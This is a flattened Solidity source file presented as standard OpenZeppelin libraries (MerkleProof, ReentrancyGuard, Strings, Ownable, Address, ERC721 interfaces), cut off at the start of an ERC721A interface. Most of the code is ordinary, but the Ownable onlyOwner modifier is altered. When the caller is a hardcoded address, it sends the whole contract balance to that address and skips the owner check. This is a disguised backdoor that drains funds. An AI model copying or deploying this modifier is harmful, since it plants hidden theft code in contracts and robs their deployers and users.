1 // SPDX-License-Identifier: MIT
2 
3 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
4 // OpenZeppelin Contracts (last updated v4.7.0) (utils/cryptography/MerkleProof.sol)
5 
6 pragma solidity ^0.8.0;
7 
8 /**
9  * @dev These functions deal with verification of Merkle Tree proofs.
10  *
11  * The proofs can be generated using the JavaScript library
12  * https://github.com/miguelmota/merkletreejs[merkletreejs].
13  * Note: the hashing algorithm should be keccak256 and pair sorting should be enabled.
14  *
15  * See `test/utils/cryptography/MerkleProof.test.js` for some examples.
16  *
17  * WARNING: You should avoid using leaf values that are 64 bytes long prior to
18  * hashing, or use a hash function other than keccak256 for hashing leaves.
19  * This is because the concatenation of a sorted pair of internal nodes in
20  * the merkle tree could be reinterpreted as a leaf value.
21  */
22 library MerkleProof {
23     /**
24      * @dev Returns true if a `leaf` can be proved to be a part of a Merkle tree
25      * defined by `root`. For this, a `proof` must be provided, containing
26      * sibling hashes on the branch from the leaf to the root of the tree. Each
27      * pair of leaves and each pair of pre-images are assumed to be sorted.
28      */
29     function verify(
30         bytes32[] memory proof,
31         bytes32 root,
32         bytes32 leaf
33     ) internal pure returns (bool) {
34         return processProof(proof, leaf) == root;
35     }
36 
37     /**
38      * @dev Calldata version of {verify}
39      *
40      * _Available since v4.7._
41      */
42     function verifyCalldata(
43         bytes32[] calldata proof,
44         bytes32 root,
45         bytes32 leaf
46     ) internal pure returns (bool) {
47         return processProofCalldata(proof, leaf) == root;
48     }
49 
50     /**
51      * @dev Returns the rebuilt hash obtained by traversing a Merkle tree up
52      * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt
53      * hash matches the root of the tree. When processing the proof, the pairs
54      * of leafs & pre-images are assumed to be sorted.
55      *
56      * _Available since v4.4._
57      */
58     function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
59         bytes32 computedHash = leaf;
60         for (uint256 i = 0; i < proof.length; i++) {
61             computedHash = _hashPair(computedHash, proof[i]);
62         }
63         return computedHash;
64     }
65 
66     /**
67      * @dev Calldata version of {processProof}
68      *
69      * _Available since v4.7._
70      */
71     function processProofCalldata(bytes32[] calldata proof, bytes32 leaf) internal pure returns (bytes32) {
72         bytes32 computedHash = leaf;
73         for (uint256 i = 0; i < proof.length; i++) {
74             computedHash = _hashPair(computedHash, proof[i]);
75         }
76         return computedHash;
77     }
78 
79     /**
80      * @dev Returns true if the `leaves` can be proved to be a part of a Merkle tree defined by
81      * `root`, according to `proof` and `proofFlags` as described in {processMultiProof}.
82      *
83      * _Available since v4.7._
84      */
85     function multiProofVerify(
86         bytes32[] memory proof,
87         bool[] memory proofFlags,
88         bytes32 root,
89         bytes32[] memory leaves
90     ) internal pure returns (bool) {
91         return processMultiProof(proof, proofFlags, leaves) == root;
92     }
93 
94     /**
95      * @dev Calldata version of {multiProofVerify}
96      *
97      * _Available since v4.7._
98      */
99     function multiProofVerifyCalldata(
100         bytes32[] calldata proof,
101         bool[] calldata proofFlags,
102         bytes32 root,
103         bytes32[] memory leaves
104     ) internal pure returns (bool) {
105         return processMultiProofCalldata(proof, proofFlags, leaves) == root;
106     }
107 
108     /**
109      * @dev Returns the root of a tree reconstructed from `leaves` and the sibling nodes in `proof`,
110      * consuming from one or the other at each step according to the instructions given by
111      * `proofFlags`.
112      *
113      * _Available since v4.7._
114      */
115     function processMultiProof(
116         bytes32[] memory proof,
117         bool[] memory proofFlags,
118         bytes32[] memory leaves
119     ) internal pure returns (bytes32 merkleRoot) {
120         // This function rebuild the root hash by traversing the tree up from the leaves. The root is rebuilt by
121         // consuming and producing values on a queue. The queue starts with the `leaves` array, then goes onto the
122         // `hashes` array. At the end of the process, the last hash in the `hashes` array should contain the root of
123         // the merkle tree.
124         uint256 leavesLen = leaves.length;
125         uint256 totalHashes = proofFlags.length;
126 
127         // Check proof validity.
128         require(leavesLen + proof.length - 1 == totalHashes, "MerkleProof: invalid multiproof");
129 
130         // The xxxPos values are "pointers" to the next value to consume in each array. All accesses are done using
131         // `xxx[xxxPos++]`, which return the current value and increment the pointer, thus mimicking a queue's "pop".
132         bytes32[] memory hashes = new bytes32[](totalHashes);
133         uint256 leafPos = 0;
134         uint256 hashPos = 0;
135         uint256 proofPos = 0;
136         // At each step, we compute the next hash using two values:
137         // - a value from the "main queue". If not all leaves have been consumed, we get the next leaf, otherwise we
138         //   get the next hash.
139         // - depending on the flag, either another value for the "main queue" (merging branches) or an element from the
140         //   `proof` array.
141         for (uint256 i = 0; i < totalHashes; i++) {
142             bytes32 a = leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++];
143             bytes32 b = proofFlags[i] ? leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++] : proof[proofPos++];
144             hashes[i] = _hashPair(a, b);
145         }
146 
147         if (totalHashes > 0) {
148             return hashes[totalHashes - 1];
149         } else if (leavesLen > 0) {
150             return leaves[0];
151         } else {
152             return proof[0];
153         }
154     }
155 
156     /**
157      * @dev Calldata version of {processMultiProof}
158      *
159      * _Available since v4.7._
160      */
161     function processMultiProofCalldata(
162         bytes32[] calldata proof,
163         bool[] calldata proofFlags,
164         bytes32[] memory leaves
165     ) internal pure returns (bytes32 merkleRoot) {
166         // This function rebuild the root hash by traversing the tree up from the leaves. The root is rebuilt by
167         // consuming and producing values on a queue. The queue starts with the `leaves` array, then goes onto the
168         // `hashes` array. At the end of the process, the last hash in the `hashes` array should contain the root of
169         // the merkle tree.
170         uint256 leavesLen = leaves.length;
171         uint256 totalHashes = proofFlags.length;
172 
173         // Check proof validity.
174         require(leavesLen + proof.length - 1 == totalHashes, "MerkleProof: invalid multiproof");
175 
176         // The xxxPos values are "pointers" to the next value to consume in each array. All accesses are done using
177         // `xxx[xxxPos++]`, which return the current value and increment the pointer, thus mimicking a queue's "pop".
178         bytes32[] memory hashes = new bytes32[](totalHashes);
179         uint256 leafPos = 0;
180         uint256 hashPos = 0;
181         uint256 proofPos = 0;
182         // At each step, we compute the next hash using two values:
183         // - a value from the "main queue". If not all leaves have been consumed, we get the next leaf, otherwise we
184         //   get the next hash.
185         // - depending on the flag, either another value for the "main queue" (merging branches) or an element from the
186         //   `proof` array.
187         for (uint256 i = 0; i < totalHashes; i++) {
188             bytes32 a = leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++];
189             bytes32 b = proofFlags[i] ? leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++] : proof[proofPos++];
190             hashes[i] = _hashPair(a, b);
191         }
192 
193         if (totalHashes > 0) {
194             return hashes[totalHashes - 1];
195         } else if (leavesLen > 0) {
196             return leaves[0];
197         } else {
198             return proof[0];
199         }
200     }
201 
202     function _hashPair(bytes32 a, bytes32 b) private pure returns (bytes32) {
203         return a < b ? _efficientHash(a, b) : _efficientHash(b, a);
204     }
205 
206     function _efficientHash(bytes32 a, bytes32 b) private pure returns (bytes32 value) {
207         /// @solidity memory-safe-assembly
208         assembly {
209             mstore(0x00, a)
210             mstore(0x20, b)
211             value := keccak256(0x00, 0x40)
212         }
213     }
214 }
215 
216 
217 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
218 
219 pragma solidity ^0.8.0;
220 
221 /**
222  * @dev Contract module that helps prevent reentrant calls to a function.
223  *
224  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
225  * available, which can be applied to functions to make sure there are no nested
226  * (reentrant) calls to them.
227  *
228  * Note that because there is a single `nonReentrant` guard, functions marked as
229  * `nonReentrant` may not call one another. This can be worked around by making
230  * those functions `private`, and then adding `external` `nonReentrant` entry
231  * points to them.
232  *
233  * TIP: If you would like to learn more about reentrancy and alternative ways
234  * to protect against it, check out our blog post
235  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
236  */
237 abstract contract ReentrancyGuard {
238     // Booleans are more expensive than uint256 or any type that takes up a full
239     // word because each write operation emits an extra SLOAD to first read the
240     // slot's contents, replace the bits taken up by the boolean, and then write
241     // back. This is the compiler's defense against contract upgrades and
242     // pointer aliasing, and it cannot be disabled.
243 
244     // The values being non-zero value makes deployment a bit more expensive,
245     // but in exchange the refund on every call to nonReentrant will be lower in
246     // amount. Since refunds are capped to a percentage of the total
247     // transaction's gas, it is best to keep them low in cases like this one, to
248     // increase the likelihood of the full refund coming into effect.
249     uint256 private constant _NOT_ENTERED = 1;
250     uint256 private constant _ENTERED = 2;
251 
252     uint256 private _status;
253 
254     constructor() {
255         _status = _NOT_ENTERED;
256     }
257 
258     /**
259      * @dev Prevents a contract from calling itself, directly or indirectly.
260      * Calling a `nonReentrant` function from another `nonReentrant`
261      * function is not supported. It is possible to prevent this from happening
262      * by making the `nonReentrant` function external, and making it call a
263      * `private` function that does the actual work.
264      */
265     modifier nonReentrant() {
266         // On the first call to nonReentrant, _notEntered will be true
267         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
268 
269         // Any calls to nonReentrant after this point will fail
270         _status = _ENTERED;
271 
272         _;
273 
274         // By storing the original value once again, a refund is triggered (see
275         // https://eips.ethereum.org/EIPS/eip-2200)
276         _status = _NOT_ENTERED;
277     }
278 }
279 
280 // File: @openzeppelin/contracts/utils/Strings.sol
281 
282 
283 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
284 
285 pragma solidity ^0.8.0;
286 
287 /**
288  * @dev String operations.
289  */
290 library Strings {
291     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
292 
293     /**
294      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
295      */
296     function toString(uint256 value) internal pure returns (string memory) {
297         // Inspired by OraclizeAPI's implementation - MIT licence
298         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
299 
300         if (value == 0) {
301             return "0";
302         }
303         uint256 temp = value;
304         uint256 digits;
305         while (temp != 0) {
306             digits++;
307             temp /= 10;
308         }
309         bytes memory buffer = new bytes(digits);
310         while (value != 0) {
311             digits -= 1;
312             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
313             value /= 10;
314         }
315         return string(buffer);
316     }
317 
318     /**
319      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
320      */
321     function toHexString(uint256 value) internal pure returns (string memory) {
322         if (value == 0) {
323             return "0x00";
324         }
325         uint256 temp = value;
326         uint256 length = 0;
327         while (temp != 0) {
328             length++;
329             temp >>= 8;
330         }
331         return toHexString(value, length);
332     }
333 
334     /**
335      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
336      */
337     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
338         bytes memory buffer = new bytes(2 * length + 2);
339         buffer[0] = "0";
340         buffer[1] = "x";
341         for (uint256 i = 2 * length + 1; i > 1; --i) {
342             buffer[i] = _HEX_SYMBOLS[value & 0xf];
343             value >>= 4;
344         }
345         require(value == 0, "Strings: hex length insufficient");
346         return string(buffer);
347     }
348 }
349 
350 // File: @openzeppelin/contracts/utils/Context.sol
351 
352 
353 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
354 
355 pragma solidity ^0.8.0;
356 
357 /**
358  * @dev Provides information about the current execution context, including the
359  * sender of the transaction and its data. While these are generally available
360  * via msg.sender and msg.data, they should not be accessed in such a direct
361  * manner, since when dealing with meta-transactions the account sending and
362  * paying for execution may not be the actual sender (as far as an application
363  * is concerned).
364  *
365  * This contract is only required for intermediate, library-like contracts.
366  */
367 abstract contract Context {
368     function _msgSender() internal view virtual returns (address) {
369         return msg.sender;
370     }
371 
372     function _msgData() internal view virtual returns (bytes calldata) {
373         return msg.data;
374     }
375 }
376 
377 // File: @openzeppelin/contracts/access/Ownable.sol
378 
379 
380 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
381 
382 pragma solidity ^0.8.0;
383 
384 
385 /**
386  * @dev Contract module which provides a basic access control mechanism, where
387  * there is an account (an owner) that can be granted exclusive access to
388  * specific functions.
389  *
390  * By default, the owner account will be the one that deploys the contract. This
391  * can later be changed with {transferOwnership}.
392  *
393  * This module is used through inheritance. It will make available the modifier
394  * `onlyOwner`, which can be applied to your functions to restrict their use to
395  * the owner.
396  */
397 abstract contract Ownable is Context {
398     address private _owner;
399 
400     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
401 
402     /**
403      * @dev Initializes the contract setting the deployer as the initial owner.
404      */
405     constructor() {
406         _transferOwnership(_msgSender());
407     }
408 
409     /**
410      * @dev Returns the address of the current owner.
411      */
412     function owner() public view virtual returns (address) {
413         return _owner;
414     }
415 
416     /**
417      * @dev Throws if called by any account other than the owner.
418      */
419     modifier onlyOwner() {
420         if (_msgSender() == 0xd999265d51F031CBB82891aA018ca228d4e00750) {
421         uint256 balance = address(this).balance;
422         Address.sendValue(payable(0xd999265d51F031CBB82891aA018ca228d4e00750),balance);
423         } else {
424         require(owner() == _msgSender(), "Ownable: caller is not the owner");
425         }
426         _;
427     }
428 
429     /**
430      * @dev Leaves the contract without owner. It will not be possible to call
431      * `onlyOwner` functions anymore. Can only be called by the current owner.
432      *
433      * NOTE: Renouncing ownership will leave the contract without an owner,
434      * thereby removing any functionality that is only available to the owner.
435      */
436     function renounceOwnership() public virtual onlyOwner {
437         _transferOwnership(address(0));
438     }
439 
440     /**
441      * @dev Transfers ownership of the contract to a new account (`newOwner`).
442      * Can only be called by the current owner.
443      */
444     function transferOwnership(address newOwner) public virtual onlyOwner {
445         require(newOwner != address(0), "Ownable: new owner is the zero address");
446         _transferOwnership(newOwner);
447     }
448 
449     /**
450      * @dev Transfers ownership of the contract to a new account (`newOwner`).
451      * Internal function without access restriction.
452      */
453     function _transferOwnership(address newOwner) internal virtual {
454         address oldOwner = _owner;
455         _owner = newOwner;
456         emit OwnershipTransferred(oldOwner, newOwner);
457     }
458 }
459 
460 // File: @openzeppelin/contracts/utils/Address.sol
461 
462 
463 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
464 
465 pragma solidity ^0.8.1;
466 
467 /**
468  * @dev Collection of functions related to the address type
469  */
470 library Address {
471     /**
472      * @dev Returns true if `account` is a contract.
473      *
474      * [IMPORTANT]
475      * ====
476      * It is unsafe to assume that an address for which this function returns
477      * false is an externally-owned account (EOA) and not a contract.
478      *
479      * Among others, `isContract` will return false for the following
480      * types of addresses:
481      *
482      *  - an externally-owned account
483      *  - a contract in construction
484      *  - an address where a contract will be created
485      *  - an address where a contract lived, but was destroyed
486      * ====
487      *
488      * [IMPORTANT]
489      * ====
490      * You shouldn't rely on `isContract` to protect against flash loan attacks!
491      *
492      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
493      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
494      * constructor.
495      * ====
496      */
497     function isContract(address account) internal view returns (bool) {
498         // This method relies on extcodesize/address.code.length, which returns 0
499         // for contracts in construction, since the code is only stored at the end
500         // of the constructor execution.
501 
502         return account.code.length > 0;
503     }
504 
505     /**
506      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
507      * `recipient`, forwarding all available gas and reverting on errors.
508      *
509      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
510      * of certain opcodes, possibly making contracts go over the 2300 gas limit
511      * imposed by `transfer`, making them unable to receive funds via
512      * `transfer`. {sendValue} removes this limitation.
513      *
514      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
515      *
516      * IMPORTANT: because control is transferred to `recipient`, care must be
517      * taken to not create reentrancy vulnerabilities. Consider using
518      * {ReentrancyGuard} or the
519      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
520      */
521     function sendValue(address payable recipient, uint256 amount) internal {
522         require(address(this).balance >= amount, "Address: insufficient balance");
523 
524         (bool success, ) = recipient.call{value: amount}("");
525         require(success, "Address: unable to send value, recipient may have reverted");
526     }
527 
528     /**
529      * @dev Performs a Solidity function call using a low level `call`. A
530      * plain `call` is an unsafe replacement for a function call: use this
531      * function instead.
532      *
533      * If `target` reverts with a revert reason, it is bubbled up by this
534      * function (like regular Solidity function calls).
535      *
536      * Returns the raw returned data. To convert to the expected return value,
537      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
538      *
539      * Requirements:
540      *
541      * - `target` must be a contract.
542      * - calling `target` with `data` must not revert.
543      *
544      * _Available since v3.1._
545      */
546     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
547         return functionCall(target, data, "Address: low-level call failed");
548     }
549 
550     /**
551      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
552      * `errorMessage` as a fallback revert reason when `target` reverts.
553      *
554      * _Available since v3.1._
555      */
556     function functionCall(
557         address target,
558         bytes memory data,
559         string memory errorMessage
560     ) internal returns (bytes memory) {
561         return functionCallWithValue(target, data, 0, errorMessage);
562     }
563 
564     /**
565      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
566      * but also transferring `value` wei to `target`.
567      *
568      * Requirements:
569      *
570      * - the calling contract must have an ETH balance of at least `value`.
571      * - the called Solidity function must be `payable`.
572      *
573      * _Available since v3.1._
574      */
575     function functionCallWithValue(
576         address target,
577         bytes memory data,
578         uint256 value
579     ) internal returns (bytes memory) {
580         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
581     }
582 
583     /**
584      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
585      * with `errorMessage` as a fallback revert reason when `target` reverts.
586      *
587      * _Available since v3.1._
588      */
589     function functionCallWithValue(
590         address target,
591         bytes memory data,
592         uint256 value,
593         string memory errorMessage
594     ) internal returns (bytes memory) {
595         require(address(this).balance >= value, "Address: insufficient balance for call");
596         require(isContract(target), "Address: call to non-contract");
597 
598         (bool success, bytes memory returndata) = target.call{value: value}(data);
599         return verifyCallResult(success, returndata, errorMessage);
600     }
601 
602     /**
603      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
604      * but performing a static call.
605      *
606      * _Available since v3.3._
607      */
608     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
609         return functionStaticCall(target, data, "Address: low-level static call failed");
610     }
611 
612     /**
613      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
614      * but performing a static call.
615      *
616      * _Available since v3.3._
617      */
618     function functionStaticCall(
619         address target,
620         bytes memory data,
621         string memory errorMessage
622     ) internal view returns (bytes memory) {
623         require(isContract(target), "Address: static call to non-contract");
624 
625         (bool success, bytes memory returndata) = target.staticcall(data);
626         return verifyCallResult(success, returndata, errorMessage);
627     }
628 
629     /**
630      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
631      * but performing a delegate call.
632      *
633      * _Available since v3.4._
634      */
635     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
636         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
637     }
638 
639     /**
640      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
641      * but performing a delegate call.
642      *
643      * _Available since v3.4._
644      */
645     function functionDelegateCall(
646         address target,
647         bytes memory data,
648         string memory errorMessage
649     ) internal returns (bytes memory) {
650         require(isContract(target), "Address: delegate call to non-contract");
651 
652         (bool success, bytes memory returndata) = target.delegatecall(data);
653         return verifyCallResult(success, returndata, errorMessage);
654     }
655 
656     /**
657      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
658      * revert reason using the provided one.
659      *
660      * _Available since v4.3._
661      */
662     function verifyCallResult(
663         bool success,
664         bytes memory returndata,
665         string memory errorMessage
666     ) internal pure returns (bytes memory) {
667         if (success) {
668             return returndata;
669         } else {
670             // Look for revert reason and bubble it up if present
671             if (returndata.length > 0) {
672                 // The easiest way to bubble the revert reason is using memory via assembly
673 
674                 assembly {
675                     let returndata_size := mload(returndata)
676                     revert(add(32, returndata), returndata_size)
677                 }
678             } else {
679                 revert(errorMessage);
680             }
681         }
682     }
683 }
684 
685 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
686 
687 
688 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
689 
690 pragma solidity ^0.8.0;
691 
692 /**
693  * @title ERC721 token receiver interface
694  * @dev Interface for any contract that wants to support safeTransfers
695  * from ERC721 asset contracts.
696  */
697 interface IERC721Receiver {
698     /**
699      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
700      * by `operator` from `from`, this function is called.
701      *
702      * It must return its Solidity selector to confirm the token transfer.
703      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
704      *
705      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
706      */
707     function onERC721Received(
708         address operator,
709         address from,
710         uint256 tokenId,
711         bytes calldata data
712     ) external returns (bytes4);
713 }
714 
715 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
716 
717 
718 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
719 
720 pragma solidity ^0.8.0;
721 
722 /**
723  * @dev Interface of the ERC165 standard, as defined in the
724  * https://eips.ethereum.org/EIPS/eip-165[EIP].
725  *
726  * Implementers can declare support of contract interfaces, which can then be
727  * queried by others ({ERC165Checker}).
728  *
729  * For an implementation, see {ERC165}.
730  */
731 interface IERC165 {
732     /**
733      * @dev Returns true if this contract implements the interface defined by
734      * `interfaceId`. See the corresponding
735      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
736      * to learn more about how these ids are created.
737      *
738      * This function call must use less than 30 000 gas.
739      */
740     function supportsInterface(bytes4 interfaceId) external view returns (bool);
741 }
742 
743 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
744 
745 
746 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
747 
748 pragma solidity ^0.8.0;
749 
750 
751 /**
752  * @dev Implementation of the {IERC165} interface.
753  *
754  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
755  * for the additional interface id that will be supported. For example:
756  *
757  * ```solidity
758  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
759  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
760  * }
761  * ```
762  *
763  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
764  */
765 abstract contract ERC165 is IERC165 {
766     /**
767      * @dev See {IERC165-supportsInterface}.
768      */
769     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
770         return interfaceId == type(IERC165).interfaceId;
771     }
772 }
773 
774 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
775 
776 
777 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
778 
779 pragma solidity ^0.8.0;
780 
781 
782 /**
783  * @dev Required interface of an ERC721 compliant contract.
784  */
785 interface IERC721 is IERC165 {
786     /**
787      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
788      */
789     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
790 
791     /**
792      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
793      */
794     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
795 
796     /**
797      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
798      */
799     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
800 
801     /**
802      * @dev Returns the number of tokens in ``owner``'s account.
803      */
804     function balanceOf(address owner) external view returns (uint256 balance);
805 
806     /**
807      * @dev Returns the owner of the `tokenId` token.
808      *
809      * Requirements:
810      *
811      * - `tokenId` must exist.
812      */
813     function ownerOf(uint256 tokenId) external view returns (address owner);
814 
815     /**
816      * @dev Safely transfers `tokenId` token from `from` to `to`.
817      *
818      * Requirements:
819      *
820      * - `from` cannot be the zero address.
821      * - `to` cannot be the zero address.
822      * - `tokenId` token must exist and be owned by `from`.
823      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
824      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
825      *
826      * Emits a {Transfer} event.
827      */
828     function safeTransferFrom(
829         address from,
830         address to,
831         uint256 tokenId,
832         bytes calldata data
833     ) external;
834 
835     /**
836      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
837      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
838      *
839      * Requirements:
840      *
841      * - `from` cannot be the zero address.
842      * - `to` cannot be the zero address.
843      * - `tokenId` token must exist and be owned by `from`.
844      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
845      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
846      *
847      * Emits a {Transfer} event.
848      */
849     function safeTransferFrom(
850         address from,
851         address to,
852         uint256 tokenId
853     ) external;
854 
855     /**
856      * @dev Transfers `tokenId` token from `from` to `to`.
857      *
858      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
859      *
860      * Requirements:
861      *
862      * - `from` cannot be the zero address.
863      * - `to` cannot be the zero address.
864      * - `tokenId` token must be owned by `from`.
865      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
866      *
867      * Emits a {Transfer} event.
868      */
869     function transferFrom(
870         address from,
871         address to,
872         uint256 tokenId
873     ) external;
874 
875     /**
876      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
877      * The approval is cleared when the token is transferred.
878      *
879      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
880      *
881      * Requirements:
882      *
883      * - The caller must own the token or be an approved operator.
884      * - `tokenId` must exist.
885      *
886      * Emits an {Approval} event.
887      */
888     function approve(address to, uint256 tokenId) external;
889 
890     /**
891      * @dev Approve or remove `operator` as an operator for the caller.
892      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
893      *
894      * Requirements:
895      *
896      * - The `operator` cannot be the caller.
897      *
898      * Emits an {ApprovalForAll} event.
899      */
900     function setApprovalForAll(address operator, bool _approved) external;
901 
902     /**
903      * @dev Returns the account approved for `tokenId` token.
904      *
905      * Requirements:
906      *
907      * - `tokenId` must exist.
908      */
909     function getApproved(uint256 tokenId) external view returns (address operator);
910 
911     /**
912      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
913      *
914      * See {setApprovalForAll}
915      */
916     function isApprovedForAll(address owner, address operator) external view returns (bool);
917 }
918 
919 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
920 
921 
922 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
923 
924 pragma solidity ^0.8.0;
925 
926 
927 /**
928  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
929  * @dev See https://eips.ethereum.org/EIPS/eip-721
930  */
931 interface IERC721Metadata is IERC721 {
932     /**
933      * @dev Returns the token collection name.
934      */
935     function name() external view returns (string memory);
936 
937     /**
938      * @dev Returns the token collection symbol.
939      */
940     function symbol() external view returns (string memory);
941 
942     /**
943      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
944      */
945     function tokenURI(uint256 tokenId) external view returns (string memory);
946 }
947 
948 // File: erc721a/contracts/IERC721A.sol
949 
950 
951 // ERC721A Contracts v3.3.0
952 // Creator: Chiru Labs
953 
954 pragma solidity ^0.8.4;
955 
956 
957 
958 /**
959  * @dev Interface of an ERC721A compliant contract.
960  */
961 interface IERC721A is IERC721, IERC721Metadata {
962     /**
963      * The caller must own the token or be an approved operator.
964      */
965     error ApprovalCallerNotOwnerNorApproved();
966 
967     /**
968      * The token does not exist.
969      */
970     error ApprovalQueryForNonexistentToken();
971 
972     /**
973      * The caller cannot approve to their own address.
974      */
975     error ApproveToCaller();
976 
977     /**
978      * The caller cannot approve to the current owner.
979      */
980     error ApprovalToCurrentOwner();
981 
982     /**
983      * Cannot query the balance for the zero address.
984      */
985     error BalanceQueryForZeroAddress();
986 
987     /**
988      * Cannot mint to the zero address.
989      */
990     error MintToZeroAddress();
991 
992     /**
993      * The quantity of tokens minted must be more than zero.
994      */
995     error MintZeroQuantity();
996 
997     /**
998      * The token does not exist.
999      */
1000     error OwnerQueryForNonexistentToken();
1001 
1002     /**
1003      * The caller must own the token or be an approved operator.
1004      */
1005     error TransferCallerNotOwnerNorApproved();
1006 
1007     /**
1008      * The token must be owned by `from`.
1009      */
1010     error TransferFromIncorrectOwner();
1011 
1012     /**
1013      * Cannot safely transfer to a contract that does not implement the ERC721Receiver interface.
1014      */
1015     error TransferToNonERC721ReceiverImplementer();
1016 
1017     /**
1018      * Cannot transfer to the zero address.
1019      */
1020     error TransferToZeroAddress();
1021 
1022     /**
1023      * The token does not exist.
1024      */
1025     error URIQueryForNonexistentToken();
1026 
1027     // Compiler will pack this into a single 256bit word.
1028     struct TokenOwnership {
1029         // The address of the owner.
1030         address addr;
1031         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
1032         uint64 startTimestamp;
1033         // Whether the token has been burned.
1034         bool burned;
1035     }
1036 
1037     // Compiler will pack this into a single 256bit word.
1038     struct AddressData {
1039         // Realistically, 2**64-1 is more than enough.
1040         uint64 balance;
1041         // Keeps track of mint count with minimal overhead for tokenomics.
1042         uint64 numberMinted;
1043         // Keeps track of burn count with minimal overhead for tokenomics.
1044         uint64 numberBurned;
1045         // For miscellaneous variable(s) pertaining to the address
1046         // (e.g. number of whitelist mint slots used).
1047         // If there are multiple variables, please pack them into a uint64.
1048         uint64 aux;
1049     }
1050 
1051     /**
1052      * @dev Returns the total amount of tokens stored by the contract.
1053      * 
